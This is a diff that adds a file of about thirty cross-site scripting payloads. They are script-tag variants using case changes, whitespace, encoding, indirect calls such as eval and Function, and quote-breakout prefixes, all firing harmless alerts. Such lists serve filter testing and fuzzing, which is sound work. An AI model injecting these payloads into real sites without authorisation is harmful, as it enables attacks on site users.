@@ -1,0 +1,31 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<script>alert(window.location)</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<script>console.log('XSS')</script>
+<SCRIPT>alert(1)</SCRIPT>
+<ScRiPt>alert(1)</ScRiPt>
+<script >alert(1)</script>
+<script	>alert(1)</script>
+<script
+>alert(1)</script>
+<script type="text/javascript">alert(1)</script>
+<script type='text/javascript'>alert(1)</script>
+<script language="javascript">alert(1)</script>
+<script language='javascript'>alert(1)</script>
+<script src=""></script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>window['alert'](1)</script>
+<script>this['alert'](1)</script>
+<script>eval('alert(1)')</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>setInterval('alert(1)',1000)</script>
+<script>Function('alert(1)')()</script>
+<script>window.alert(1)</script>
+<script>top.alert(1)</script>
+<script>parent.alert(1)</script>
+<script>self.alert(1)</script>
+"><script>alert(1)</script>
+'></script><script>alert(1)</script>
